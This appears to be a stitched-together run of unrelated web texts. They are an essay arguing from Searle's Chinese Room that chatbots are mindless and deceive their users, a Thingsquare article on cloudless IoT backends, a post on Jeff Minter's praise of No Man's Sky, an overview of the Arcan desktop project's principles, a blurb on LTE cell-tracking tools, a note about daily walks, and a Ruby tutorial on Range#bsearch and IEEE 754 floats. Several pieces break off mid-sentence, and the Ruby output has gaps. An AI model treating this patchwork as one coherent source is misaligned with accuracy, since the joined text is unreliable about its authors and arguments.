<p>There is another possibility: if a human can’t tell whether he’s interacting with computer software, or a human, he’s being duped. Thinking that he’s interacting with a mind like his–a feeling, experiencing subject–he will treat the computer as such, and will be manipulated to act in the interest of the robot’s owner. The artificial minds created by better and better software development techniques–running on exponentially faster computer processors–mark new heights in the art of deception.  </p>



<h2>A Patient in John Searle’s Chinese Room</h2>



<p><em>John Searle, I don’t know whether the allegations that you committed sexual mischief are true, or how grievous the transgressions may have been. Whatever wrongdoing you have committed, we still recognize the good deeds you have done. Your contributions to philosophy have touched my intellectual life: the predominance of the view of compatibilism in analytic philosophy–the idea that free will and determinism can coexist–seems like a cancer of doublethink to me, and you set me straight. Then, by studying your Chinese Room Argument, I overcame the youthful folly of believing that computers are minds….</em></p>



<p><a href="https://plato.stanford.edu/entries/chinese-room/">The Chinese Room Thought Experiment and related argument</a> must be one of the clearest, simplest, most conclusive moments in philosophy.Here’s an explanation of it. </p>



<p>The argument relies on a comparison, so we have to imagine two things at once. </p>



<p>First, think of an imaginary chatbot which speaks fluent Chinese, and can’t be distinguished from a human, so that it passes the Turing Test. Now, let’s imagine the actual Chinese Room: it’s a kind of a room with a mail-slot in it, and a lonely worker, with a massive list of instructions, maybe a flowchart. The worker doesn’t speak a word of Chinese. When a message is inserted into the slot, the worker looks at the signs written on it, then consults his instructions. The instructions contain a bunch of rules based on which characters appear on the message. The rules are applied to formulate a new message as a response. The functionary writes down the new Chinese characters by following his instructions. He doesn’t understand the symbols at all. When he’s done, he ejects the answer through the slot.</p>



<p>The metaphor is pretty simple to follow, if you know something about computer programming. The man outside the room is the user of the software. The instructions are source code. The functionary inside the room is the (very slow) computer. </p>



<p>Now, to the point: who, in this scenario, actually knows Chinese? The man outside the slot certainly knows Chinese. He’s using the service because that’s his native language. Also, the team of scholars who wrote the instructions–the software developers–might know Chinese. But the functionary does not. A computer manipulates symbols. It takes input from a user and generates output based on control structures. It passes the Turing Test, but doesn’t have a mind at all. It blindly manipulates bits which have no meaning to it. It may say “I love you”–or make any other claim of feeling or emotion–but this is pure deception. There is no “I” there, no subject.   </p>



<p>No matter how complex our programs become–and whether they are created through traditional software engineering by experts in their domains, or by new techniques such as machine learning–computers are only simulations of minds, and simulations must never be confused for what they simulate. They blindly manipulate symbols; humans–maybe animals, but that’s a different debate–are the only  ones who understand these symbols.</p>



<p>Learning about the Chinese Room, I visualize my visit there as a stay in a hospital, and Searle a medical doctor. He cures me of the chronic illusion that computers are minds. There is, as of yet, no program to implement a cure for the general population, and how can there be one? For we need to attain some knowledge of computer programming and a little philosophy, before we can be cured. And many of us would rather live the illusion. More on this, at the end of the article.</p>



<h2>Android Pinocchios and Discrimination</h2>



<p>The popular narratives of AI all seem to follow a similar form. If there are exceptions, I’d certainly like to discover them. The form goes something like this: at one point, artificial minds emerge. Our dizzyingly swift technological progress means that nobody is surprised. Robots follow their own interests, have desires, feel pain. Humans may fall in love with them, as in the 2013 movie <a href="https://en.wikipedia.org/wiki/Her_(film)">Her</a>, and humans may commit great harm to them, torturing them, as seen in Stephen Spielberg’s visually fantastic AI. Both of these films are worth watching. And Spielberg <em>does </em>portray the problem of the deceptive quality of AI, a world in which it’s not clear what is human (or animal), and what is robot. But the emergence of mind from machine is not the real-life narrative we are living now. Searle’s Chinese Room argument proves it! So why is this (false) narrative so pervasive?</p>



<p>There are a few reasons our writers may tell stories about the creation of artificial minds. They stem from a long literary tradition of such creations, from the myth of Pygmalion (told in Ovid’s <em>Metamorphoses</em>), <em>Frankenstein</em>, and <em>The Adventures of Pinocchio</em>, among many others. These stories satisfy our fascination with magic, whether we believe in magic or not. </p>



<p>And with every new advancement in computing and robotics, the claim which equates <em>magic </em>with <em>technology </em>becomes more viable: Moore’s Law’s doubling of processor power every eighteen months–exponential improvement–astounds the mind; We will soon have self driving cars on our roads. Bits of Arabic can be translated by machine into English, with outstanding results while, a few years back, the translators made many basic mistakes. We have detailed interactive maps of almost all of the Earth–spatial, though not temporal, crystal balls. And our social networks and websites know if we have a bald head, a missing tooth, wrinkles–and advertise plastic surgery to correct such flaws, even, I believe, when we have never researched these themes. We give speech-recognition robots orders and ask them questions, vocally. If we can do all of these things, can’t we create artificial minds?  (Answer: maybe we can, but our current trajectory of increasing processing speed won’t let us escape the Chinese Room.)</p>



<p>Another aspect of narratives of artificial minds relates to the narratives of our histories. Many of our most horrible acts have been caused by seeing The Other–in any of its forms–as a thing, an object rather than a subject. This has been the case in slavery, misogyny, antisemitism, racism, homophobia, and so on. The atrocity which haunts our imaginations most in the West–the genocide that occurred in the heart of the “civilized world”–was only possible because the Jews were seen as subhuman, or even “subanimal.” It is important that we take care to avoid such deception, the cognitive imaging of a thinking, feeling being as unthinking and unfeeling. We may include now the suffering of animals, the hardship of being a product in industrialized farming.</p>



<p> And in this quest to avoid treating new groups as objects, we see ethical value in narratives about cruelty to androids. For, if androids are subjects, but are different from us biologically, we risk the fear of mistreating them. The torture spectacle scene in Spielberg’s AI proffers this didactic warning, and we ought to heed it <em>if</em> we truly do create artificial minds.</p>



<h2>Dystopian Vertigo: Handsome Zombies Win our Hearts</h2>



<p>The narratives of the emergence of artificial minds are opposed to our real narrative of technological progress in computer software and hardware and robotics. There is no evidence that we will actually succeed in creating an artificial mind–and plenty of evidence that we will not do so by developing increasingly complex software.</p>



<p>As our bots become more convincing, they deceive us more fully.  The looming problem is not lack of empathy for robots, it’s misguided empathy– empathy which has no sentient target because its target is just a mindless computer program carefully engineered to mimic human emotion. Rather than encouraging empathy for the non-biological–as in Spielberg–we need to discourage …</p></div></div></article></div></div>

<p>We are not alone in believing in the idea of a cloudless IoT. In the IoT community, the concept is often called <a href="https://en.wikipedia.org/wiki/Edge_computing" target="_blank">edge</a> or <a href="https://en.wikipedia.org/wiki/Fog_computing" target="_blank">fog</a> computing. There are entire software platforms, such as the <a href="https://litmusautomation.com/en/loopedge/" target="_blank">Litmus LoopEdge platform</a>, <a href="https://azure.microsoft.com/en-us/services/iot-edge/" target="_blank">Microsoft Azure Edge</a>, and the <a href="https://crosser.io/solutions/iot-edge-analytics/" target="_blank">Crosser IoT edge analytics suite</a>, that are built to run off the grid. There are even custom <a href="https://cloud.google.com/edge-tpu/" target="_blank">hardware chips</a> designed to support off-the-cloud computation, usually speech&nbsp;processing.</p>
<p>There also an old adage that <i>the Internet of things without the Internet is just … things</i>. This is not true: there are many situations where IoT systems without Internet can be as valuable as Internet-enabled IoT&nbsp;systems.</p>
<p>We at Thingsquare have built and deployed several cloudless IoT systems with the no-cloud version of our IoT platform,&nbsp;including:</p>
<ul>
<li><strong>Electrical generators</strong>. These are deployed in a remote location where there is little or no Internet&nbsp;access.</li>
<li><strong>Industrial machinery</strong>. These are deployed as a completely standalone product with a separate touch screen on the local&nbsp;controller.</li>
<li><strong>Industrial lighting</strong>. These are run in places where customers want a completely siloed&nbsp;system.</li>

<p>But let’s first look at why we use the cloud at all. Because there are good reasons for doing&nbsp;so.</p>

Sometimes it is not practical, or desirable, to rely on an external cloud service to operate your IoT system

<h2 id="why-iot-in-the-cloud-">Why IoT in the&nbsp;cloud?</h2>
<p>There are good reasons for why the backend logic of an IoT system is run in the&nbsp;cloud:</p>
<ul>
<li><strong>Data storage</strong>: The cloud can store an almost unlimited amount of&nbsp;data.</li>
<li><strong>Computation</strong>: Some mechanisms needs an abundance of computational power, which is something that the cloud can provide an almost unlimited amount&nbsp;of.</li>
<li><strong>Remote access</strong>: To provide users with remote access to the data generated by the IoT devices, or to control the devices themselves, you need to have a cloud service that connects the devices with their&nbsp;users.</li>
<li><strong>Access control</strong>: The cloud can provide effective access control mechanisms for your&nbsp;users.</li>
<li><strong>Data cross-referencing</strong>: To be able to run effective machine learning algorithms, you sometimes need access to a wide range of data. The cloud lets you collect data from more than one site to cross-reference and combine this&nbsp;data.</li>
<li><strong>Application integration</strong>: IoT systems rarely run on their own. Integration with other software systems is much easier if the backend is located in a single place: the&nbsp;cloud.</li>
<li><strong>Security updates</strong>: when the IoT backend is run in the cloud, a dedicated security team can keep track of and apply security updates as&nbsp;needed.</li>
</ul>
<p>These reasons, which are good reasons, are why most IoT systems today are provided through the cloud. Thingsquare is no&nbsp;exception.</p>
<p>The backend portion of the <a href="https://www.thingsquare.com/iot-platform/">Thingsquare IoT platform</a> is originally designed to be run in the cloud. Sometimes the backend is running on a typical cloud provider like Amazon Web Services, and sometimes the backend is installed on a hosted machine, as a traditional on-premise software&nbsp;package.</p>
<p>But the running the IoT backend in cloud does come with some&nbsp;drawbacks.</p>
<h2 id="why-cloudless-iot-">Why cloudless&nbsp;IoT?</h2>
<p>There are good reasons to not rely on an always-on cloud connection for every IoT&nbsp;project:</p>
<ul>
<li><strong>Stability</strong>: cloud services may go down so avoiding the cloud may therefore increase&nbsp;stability.</li>
<li><strong>Persistence</strong>: cloud services may go away so avoiding the cloud may allow the IoT system to run for ever, without relying on the hosting company to&nbsp;persist.</li>
<li><strong>Data privacy</strong>: sometimes data should not leave the location where it is&nbsp;generated.</li>
<li><strong>Security</strong>: fewer network connections means fewer attack&nbsp;vectors.</li>
<li><strong>Necessity</strong>: sometimes there just isn’t Internet&nbsp;access.</li>
</ul>
<p>Any cloud-based software may become unreachable if the cloud goes down. This can happen even for <a href="https://www.cbronline.com/news/google-cloud-down" target="_blank">companies like Google</a>, who arguably has state-of-the-art cloud infrastructures and one of the best cloud teams in the world. Any IoT solution that wholly depends on the cloud will suffer an outage if the cloud goes&nbsp;down.</p>
<p>Because the cloud service is a living thing, it may die. This can happen if the company that runs the service goes away or if it simply decides that it is no longer economical to keep it running. There are several <a href="https://hackaday.com/2019/11/14/best-buys-iot-goes-dark-leaving-some-smart-products-dumbfounded/">real-world</a> <a href="https://www.theverge.com/2016/4/4/11362928/google-nest-revolv-shutdown-smart-home-products">examples</a> of&nbsp;this.</p>
<p>But the most compelling reason to why use a cloudless IoT system is when Internet access is unavailable. At Thingsquare, we have been working with projects where the IoT system is deployed in rural Africa, where Internet access is spotty at best. And with projects in countries Internet access has been generally available, but where the IoT system has been inside a deep cellar where 4G access was&nbsp;impossible.</p>
<h2 id="the-challenges-of-cloudless-iot">The challenges of cloudless&nbsp;IoT</h2>
<p>Moving the IoT backend away from the cloud, closer to the IoT devices presents a number of&nbsp;challenges:</p>
<ul>
<li><strong>Authentication</strong>: authentication is significantly easier with the cloud, thanks to mechanisms such as 2 factor&nbsp;authentication.</li>
<li><strong>Remote access</strong>: providing remote access without the cloud is very difficult and in most cases&nbsp;impossible.</li>
<li><strong>Data processing</strong>: crunching numbers without having access to the abundance of storage and computation that the cloud provides is significantly&nbsp;harder.</li>
<li><strong>Software deployment</strong>: many IoT systems need data processing or similar mechanisms, and these systems are often designed to be run in the&nbsp;cloud.</li>
<li><strong>Software updates</strong>: software is a living thing and needs to be kept up to&nbsp;date.</li>
</ul>
<p>These issues result in trade-offs. Any IoT system that is deployed away from the cloud must be prepared to deal with&nbsp;them.</p>
<h2 id="a-practical-approach-to-a-cloudless-iot">A practical approach to a cloudless&nbsp;IoT</h2>
<p>Thingsquare takes a deliberately simple approach to the cloudless&nbsp;IoT:</p>
<ul>
<li>We run our IoT backend on a non-connected local&nbsp;controller</li>
<li>Deal with resulting the trade-offs on a case-by-case&nbsp;basis</li>
</ul>
<p>The local controller can run on a piece of hardware similar to a Raspberry Pi. The local controller is deployed on an on-site network and we provide a user interface over that network only. The user interface is accessible through a smartphone app, which can detect nearby local controllers via Bluetooth, and let users interact with&nbsp;devices.</p>
<p>The backend logic of the IoT application, which would normally run in the cloud, also runs on the local controller. This also means that the backend application must be scaled down to the limits of a Raspberry Pi-class&nbsp;device.</p>

</p>
</div>

</div>
</div>


<p>Since we cannot expect the local controller hardware to be as robust as a cloud host, particularly if the local controller is based on an <span>SD</span> drive, we limit disk writes by storing volatile data in memory. This means that software that runs on top of the API must be prepared to deal with having access to less&nbsp;data.</p>
<h3 id="user-authentication">User&nbsp;authentication</h3>
<p>To authenticate users, we use a two-tiered approach. The first tier is to leverage the existing access control to the local WiFi. If a user is authenticated to the local WiFi, this tier assumes that the user also should have access to the local controller and its devices. It is possible to configure the access level that such non-authenticated local users should&nbsp;have.</p>
<p>The second tier uses a hybrid approach: we use the cloud to authenticate the user and provide an access token to the local controller. The local controller announces its presence with encrypted Bluetooth beacons that the smartphone app uses to authenticate each user. This requires the users to have an account in the cloud. The app checks with the cloud server to match the encrypted beacon and the user account. If the user has access, the server responds with an access key to the local&nbsp;controller.</p>
<h3 id="device-authentication">Device&nbsp;authentication</h3>
<p>Device authentication is comparatively easier than user authentication, because devices can be preprogrammed with <span>TLS</span> certificates. We&nbsp;there</p>
<h3 id="software-delivery-with-a-git-repository">Software delivery with a git&nbsp;repository</h3>
<p>We deliver all software over a managed <a href="https://en.wikipedia.org/wiki/Git">git repository</a>. This repository can be updated by connecting the local controller to the Internet and requesting an update, or manually via a <span>USB</span>&nbsp;stick.</p>
<div>
<div>
<p>
For offline local controllers, software updates are provided via git repository, either distributed automatically via a temporary network connection or manually with a <span>USB</span> stick.
</p>
</div>
</div>

<h3 id="firmware-updates">Firmware&nbsp;updates</h3>
<p>Signed firmware update files are included in the git repository. Devices may request updates from the local controller, just as they do when they are connected to a cloud&nbsp;backend.</p>
<p>Because we use the full IoT backend software, <a href="https://www.thingsquare.com/blog/articles/network-updates">full-network <span>OTA</span> updates</a> work as&nbsp;usual.</p>
<h3 id="user-interface">User&nbsp;interface</h3>
<p>The local controller may present a user interface with a touch screen physically connected to the controller, or over the WiFi to smartphone apps on the same network. By default, the user interface is implemented via <span>HTML5</span>/JS/CSS and is updated via the git&nbsp;repository.</p>
<h2 id="conclusions">Conclusions</h2>
<p>The cloud is an integral part of the Internet of Things. But there are situations in which the cloud is not the best&nbsp;choice.</p>
<p>Thingsquare provides a local, cloudless IoT solution, based on the same software that is backing our cloud-based offering, that solves the problems with software delivery, user interface access, and firmware updates for the cloudless&nbsp;IoT.</p>

<p>“On the eve of the next generation” of game consoles (the new Sony PS5 and Microsoft Xbox Series X), <a href="https://www.gamesradar.com/edge/"><em>Edge</em> magazine</a>, in issue #352 (Christmas 2020 issue), is running an article entitled “Games Of The Generation.” The piece includes a variety of industry notables sharing their pick of a game released since the arrival of the PS4 and Xbox One worthy to receive this title.</p>



<p>The list is comprised of 20 games, their advocates describing their reasons for bestowing such singular note upon them. Some are extremely well known — <em>Red Dead Redemption 2</em>, <em>The Legend of Zelda: Breath of the Wild</em>, <em>Ico</em> — while others are less so. And among them is Hello Games’ <em>No Man’s Sky</em>. </p>



<figure><blockquote><p>“…our Games Of The Generation awards go to the crème de la crème — those Edge has judged to represent the pinnacle of game design as we know it today.”</p></blockquote></figure>



<p>Within, legendary developer and founder of Llamasoft, <a href="https://en.wikipedia.org/wiki/Jeff_Minter">Jeff Minter</a>, has named <em><a href="https://www.nomanssky.com/">No Man’s Sky</a></em> his Game Of The Generation. With a development career that began in 1981 with titles for the Sinclair ZX80 micro, Minter is known for a great many (and frequently psychedelic) titles across many platforms, including 8 and 16-bit Ataris, C64, Amiga, Nuon, PC, iOS, Xbox 360, and PS4. Some of his most notable titles include <em><a href="https://en.wikipedia.org/wiki/Gridrunner">Gridrunner</a>; <a href="https://en.wikipedia.org/wiki/Hover_Bovver">Hover Bovver</a>; <a href="https://en.wikipedia.org/wiki/Attack_of_the_Mutant_Camels">Attack of the Mutant Camels</a>; <a href="https://en.wikipedia.org/wiki/Neon_(light_synthesizer)">the Virtual Light Machine/Neon</a>; <a href="https://en.wikipedia.org/wiki/Space_Giraffe">Space Giraffe</a>; <a href="https://bytecellar.com/2008/07/12/i_remember_how/">Tempest 2000, 3000</a>, <a href="https://en.wikipedia.org/wiki/Tempest_4000">4000</a>; <a href="https://en.wikipedia.org/wiki/TxK">TxK</a>,</em> <em>the iOS <a href="https://toucharcade.com/2011/01/06/jeff-minters-minotaur-rescue-charges-into-the-app-store/">Minotaur Project</a></em>; and <em><a href="https://en.wikipedia.org/wiki/Polybius_(2017_video_game)">Polybius</a></em>. Additionally, he has long been one of this writers’ true industry heroes. </p>

<p>Soon after the launch of <em>No Man’s Sky</em> back in 2016, Minter began tweeting his enjoyment exploring the wild and alien, procedurally generated worlds that Hello Games had brought into being. <a href="http://minotaurproject.co.uk/blog/?p=380">A post on his blog</a> from September 2106 (don’t let the title fool you) expresses the degree to which the game had impressed him. (His post was included in a list of articles reacting to <em>No Man’s Sky</em> on the first post made from <em>this</em> blog, <a href="https://nmsspot.com/2016/09/01/a-few-words-about-the-best-game-ive-ever-played-no-mans-sky/">“A Few Words About the Best Game I’ve Ever Played: ‘No Man’s Sky’”</a>, on September 1, 2016.) </p>



<p>A brief excerpt from Minter’s assessment of No Man’s Sky (shown in full, above), follows. </p>



<blockquote><p>Regarding a ‘game of the generation’, I think for me it’d have to be No Man’s Sky. Even back at the very start when there wasn’t a great deal of complex gameplay in it (and the developers were taking a right kicking for that), nonetheless I thought the style was fantastic (recreating almost perfectly the style of 1970s sci-fi book covers) and remarkably creating an explorable universe in that style was quite an amazing achievement. …</p></blockquote>



<p>This nod from industry veteran Jeff Minter is mighty kudos, indeed, for Hello Games and the universe they have created with <em>No Man’s Sky</em>. And, thinking about it, this seems a rather apt post to have put together on Thanksgiving Day!</p>

      <div>
        <article lang="en">
          
          <p>This post is an overview of the guiding principles driving much of the
work behind the main parts of the <a href="https://arcan-fe.com/">Arcan Project</a>. For
those unaware, Arcan is presented as something as uncommon as a ‘desktop
engine’. The grand claim is that modifying and understanding the entirety of
your desktop should be ‘patching scripts’ level easy if we rework current
popular abstractions and adjust the division of labour.</p>

<p>The principles themselves link together to tell a large chunk of the vision of
the ‘divergent desktop’; a story that has been slowly getting its shape over
many years, greatly influenced by a number of publicly documented experiments
as well as seminal works such as Von Neumann’s “The Computer and the Brain”,
Norbert Weiner’s “The Human use of Human Beings”, Ian Hacking on “Representing
and Intervening”, Jaron Lanier’s trilogy on what the future may hold in store,
as well as the nowadays less digestible amalgamation of +Fravia’s Search Lores.</p>

<p>The overview is quite a long read in its own right, and full versions of each
principle will be added as individual articles over time – If the contents in
the sections here comes off as a bit dense and hard to ingest, fret not! They
are more teasers or appetisers, the full course meal will have better pacing
and technical depth.</p>

<p>For the sake of convenience, here are navigational links to the individual
sections:</p>

</ol>

<h2 id="backstory-and-motivation">Backstory and Motivation</h2>

<p>The Arcan project, at its core, is rooted in assumption that the ‘desktop’ way
of interfacing with computing is inching towards its last of breaths, and
rewriting X11 or JSONifying STDOUT won’t provide much more air than for a final
gasp.</p>

<p>The upside is that this may well turn out to be something positive that
provides opportunity for radical simplification and restructuring of the myriad
of technologies that make out the Rube Goldbergian contraption that is the ‘modern’
desktop.</p>

<p>The first non-academic presentation (<a href="https://youtube.com/watch?v=07nqZIFRDJg">video</a>)
on the Arcan project had a terse, technical-overview style to it, with very little
in terms of motivation or actual intended direction.</p>

<p>The reason for that was that I wanted to keep the attention and focus on “what it is”
rather than “what will it ever be used for”, and carefully note who tries to fill
in the cryptic blank spaces, and with what. This was predicated on the belief
that honest dissemination is done by first demonstrating the feasibility and
soundness of the fundamentals of the tech in isolation; flowery visions,
soap-boxing and sociopolitical annotation are best left deferred to separate
stages should the underlying tech be sufficiently coherent and robust.</p>

<p>It is not, however, some vacuous perspective of the technology as living a life
disjunct from the social consequences of its application, but having that as
the goto default mental model for any fledgling utterances is as much of a
fool’s errand as thinking that it should never be viewed through the optics of
an abstract larger social organism.</p>

<p>The basic motivation for <em>all</em> of this is as follows:</p>

<blockquote>
  <p>I am of humble needs and wants: I want to expand my agency, security, safety and quality of experience in regards to all things that computing touch. The largest obstacle to that expansion, right now, is the chaos and complexity of user-space, the dependency creep towards an online ‘service-space’, the peering eyes this ‘service space’ uses to study and repackage some naive interpretation of ‘you’, and how this service space is being used to mutate social- and critical- infrastructure towards something wholly frightening.</p>
</blockquote>

<p>On a personal level, I have coded and experimented with virtually everything
computing since the days of the venerable C-64 (divide it by two, flip it over,
that’s 23) – viruses, anti-viruses; drm protections, cracks; database
engines; operating system kernels; cheats, bots and anti-cheats; emulators
(both interpreter dance and JITterbug); demos; games; parsers for more
formats than I can remember; exploits as well as mitigations. I have worked in
academia, government, military-industrial, fortune-500 as well as fledgling
startups, and got the scars and theses to prove it. The ‘left to observe’ list
has grown rather short over the years.</p>

<p>During this time, the evolution of the capabilities of the devices themselves
have exceeded all expectactions and is nothing short of spectacular. The
hardware and software lockout which plagued the early days is, relatively
speaking, minor; access to both capable devices and deep technical information
has become absolutely stellar, overwhelmingly so. The days of begging companies
for scraps of hardware; scraping public libraries and dumpsters for slices of
information; for quid-pro-quo trading of hacker ‘secrets’ and basic software
building blocks (‘warez’) are mostly faint memories. Hopefully they will remain
as such in spite of troubling signs up ahead.</p>

<p>The counterweight to this positive development is that things have become complex
to the degree that a thorough and deep understanding, <em>preconditions</em> to responsible
control and agency, is a hard thing to come by, and an even harder thing to fight
for. Just add more dependencies and layers! Get it to market! Cash out! Build a
community! Become its figurehead! Sell the community! Pass the plate! Don’t forget
to Like Comment and Subscribe! Oh and this message was sponsored by yet another
pointless VPN from a provider you can’t trust but somehow protects you from a
network you don’t trust. With such words the once so tiny tech snowball continues
its merry way down the mountain towards the village.</p>

<p>No matter the outcome, I have more things on the immediate ‘todo’ in terms of
creative things alone – than I have hours left to live, regardless of how many
those turn out to be. That is a pleasant mental image to fall back on in times of
gloom and doom.</p>

<p>My dedication to this project and the tens of thousands of invested hours has
been described as both ‘a labour of love’ as well as the more colloquial
‘fucking insane’, though personally, I view it as an act of necessity.</p>

<p>Many a times the journey has felt like digging out of a prison using the
collarbone of a fallen mate as a makeshift shovel, fuelled by the vapours of
some faint hope that there is a relatively more free world waiting within
reach, and that the proverbial roses I can smell are not just a hallucinogenic
side effect from some invisible gas deposit that this old canary has stumbled
upon.</p>

<p>The motivation is not all some evolutionary struggle for freedom. The rest
comes from bitter anger, even resentment, towards the dominant status quo and
the trajectory that computing interfaces as a whole is moving along; pandering
to trivial attention grabbing nonsense (‘engagement’) rather than crafting
sharper tools that can claw at the delicious problems that the future holds in
store.</p>

<h2 id="principle-1-professionals-first">Principle 1: Professionals First</h2>


<p>The traditional desktop is a compromise of interests, with the more recent bias
being towards appealing to a supposed ‘mainstream’ audience. This made sense
from an economical growth standpoint within the kinetics of the peculiar brand
of capitalism at the time; the previous demographic was already hooked on the
computing drug - being ‘users’ after all.</p>

<p>The thing nowadays is that the load-bearing mainstream audience is opting out at
a rapid rate and for good reason; smartphones, tablets, digital ‘assistants’,
gaming consoles and so on are all chopping up the generic ‘desktop’ into more
controlled corporate thiefdoms.</p>

<p>Many of the past compromises that were made in order to accomodate this wider
and less experienced audience are also unnecessarily restricting agency,
precision and and efficiency for those (‘the professional’) who possess both a
stronger mental model of computing, and a vested interest in its advancement.</p>

<p>It makes little sense to try and convince your grandmother that she needs a
Free! Open-Source! desktop, and it is a farce, bordering on self-harm, to still
use that scenario as part of some requirement specification for the future.</p>

<p>That aside, the ‘professional’ here is not meant as a vain appeal to exclusionary
hacker elitism – before the numbers of those within such lines dip towards that
of past ‘biker freedom’ seekers such as radio ‘amateurs’, circuit benders and
BBS operators. The ‘professional’ is acknowledging that there is a large number
(millions) of key individuals in a wide gamut of professions that are currenty
wasting much of their time and talents thanks to misguided attempts at software
ergonomics that will try and make due with what the web can give them, but they
should not have to.</p>

<p><em>Revisit past workflows, put the professional first.</em></p>


<h2 id="principle-2-diversify-experience">Principle 2: Diversify Experience</h2>

<p>A long standing maxim in computing is that of ‘mechanism, not policy’. From
a user experience perspective, it is rooted in the assumption that the user
is both willing- and capable- of leveraging mechanisms and configure them into
their own sets of policies. This has largely failed in the ‘desktop’ sense,
and very much stagnated in the command-line processing one.</p>

<p>There are many possible reasons for this, and one likely culprit on a high
level is the marketing gospel of ‘it just works’. This is a rhetoric which
strongly favours a ‘brand identity’ preset of strict policies and aesthetics
at the desktop level and beyond. Its implementation allows for little to no
accessible layering in between the opaqueness of a UI element such as a
‘button’ and the set of actions the idea of it ‘working’ represents.</p>

<p>This turns into a problem when your personal expectations of what ‘just works’
happens to clash with those of the …</p></article></div></div></div>

<h2>LTE Tools</h2>
<h2>Introduction</h2>
<p>This is a collection of open source software (OSS) tools to locate and track LTE basestation cells using very low performance RF front ends. For example, these tools work with RTL2832 based dongles (E4000, R820T, etc.) which have a noise figure of 20dB, only 8 bits in the A/D, and a crystal with a frequency error of about 100 PPM. In fact, since the LTE downlink center frequencies are accurate to within 0.050 PPM, these tools can be used to calibrate the receiver's oscillator.</p>
<ul>
<li><a href="http://www.evrytania.com/lte-tools/78-default-category/77-lte-cell-scanner">LTE Cell Scanner</a>&nbsp;is a tool that will scan a set of frequencies and identify LTE carriers. It also decodes the MIB.</li>
<li><a href="http://www.evrytania.com/lte-tools/78-default-category/78-lte-tracker">LTE Tracker</a> is a realtime tool that continuously identifies and tracks all the LTE cells on a particular frequency.</li>
</ul>
<p>This code was developed on an Ubuntu 12.04 system but has also been <a href="http://superkuh.com/rtlsdr.html#ltescanner" target="_blank">made to work on Ubuntu 10.04</a>.</p>

<p>Every day I go for a 45-minute walk first thing in the morning. I’ve been doing it for almost two months now, I think. And it has become one of the most essential parts of my daily routine.</p>



<p>Walking awakens my mind and my body. It makes me feel energized, sharp and clear-headed. It helps me disentangle my thoughts, digest experiences and see unfamiliar patterns.&nbsp;</p>



<p>Maybe that’s why it’s so easy for me to write while I walk. Why it comes so naturally. I hate to admit it, but for some reason I struggle to write standing still. I need cadence. I need movement.</p>



<p>When I walk, my mind and my body move together. They ride and go along in unison, creating a feeling of immense tranquillity and equilibrium. Even when I’m witnessing dark or conflicting thoughts, it all flows smoothly.</p>



<p>I’ve always like walking. And I think I’ve also known for a while how much it helps me. Despite that, though, it was never a consistent habit. It was always occasional.</p>



<p>But now I seriously doubt I could go on with my life without doing it every day. I would go mad. Especially now that I call myself a creator.</p>



<p>Walking has become not just indispensable to my work and productivity, but also to my happiness and well-being — it is a form of self-care, even therapy.</p>

Well the answer differs depending on whether you are asking a mathematician, philosopher, or a Ruby developer. I’m not a mathematician or a philosopher, but I am a Ruby developer, so I can tell you than 1.5 is the midpoint between 0 and infinity.</p>  <p><a href="https://ruby-doc.org/core-2.7.2/Range.html#method-i-bsearch"><code>Range#bsearch</code></a> performs binary search within a range. For example, lets use it to find the first integer that’s larger than 42 (which is 43) and see the values it inspects to find it.</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The integer larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>

For example, consider the following code, which is the same as the one above but the range is between 0 and <code>Float::INFINITY</code>:</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>Float</span><span>::</span><span>INFINITY</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The float larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>We then get the following output when we run it (note that the output has been truncated because it’s too long):</p> <div><div><pre><code>The float larger than 42 is: 42.00000000000001
The following values were inspected:
1.5

42.424560546875
42.1746826171875
...
</code></pre></div></div> <p>The first few values we inspect in the binary search are rather odd: <code>1.5</code>, <code>1.6759759912428246e+154</code>, <code>1.5921412270130977e+77</code>, etc. Where do these numbers come from? To explain these values, we first have to understand how IEEE 754 floating-point numbers work.</p>  <p>Ruby floats are double-precision IEEE 754 floating-point numbers. If you don’t know the basics about how floating-point numbers are represented in memory, there are plenty of resources on the internet, <a href="https://fabiensanglard.net/floating_point_visually_explained/">here’s one</a>.</p> <p>Of special interest to us is how infinity is represented in floating-point. Infinity is a special value where the exponent bits are all 1’s and the significand bits (also known as fraction or mantissa) are all 0’s.</p>  <p>Ruby’s <code>Range#bsearch</code> is implemented in a C function called <a href="https://github.com/ruby/ruby/blob/5512de76033773a77f686f3cb2adc849356f7674/range.c#L680"><code>range_bsearch</code></a>. There are several cases it deals with, and the one of interest is the case when either endpoint is a float. In this case, it performs a clever trick. It reads the C double type of the Ruby float endpoints as 64-bit integers (<code>int64_t</code>)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Note that this is <strong>not</strong> the same as casting the double into integer type, this is directly reading the double as a 64-bit integer. Are you confused? I sure was when I first read this code so if you are too, it’ll make more sense later on. Trust me.</p> <p>Let’s revisit how infinity is represented in floating-point. Here’s it visualized (through the help of the amazing website <a href="https://float.exposed/">float.exposed</a>). We can see that the sign is 0 (this is a positive value), all exponent bits are 1, and all significand bits are 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/infinity.png"> </figure> <p>And of course, <code>0</code> is represented in floating-point with all the bits set to 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/zero.png"> </figure> <p>So what if we read these bits of the endpoint as if they were integers? Then our range would be between <code>0</code> and <code>9218868437227405312</code>. What’s the midpoint of this range? It’s <code>4609434218613702656</code>. Now let’s plug this value back into <a href="https://float.exposed/0x3ff8000000000000">float.exposed</a>.</p> <figure> <img 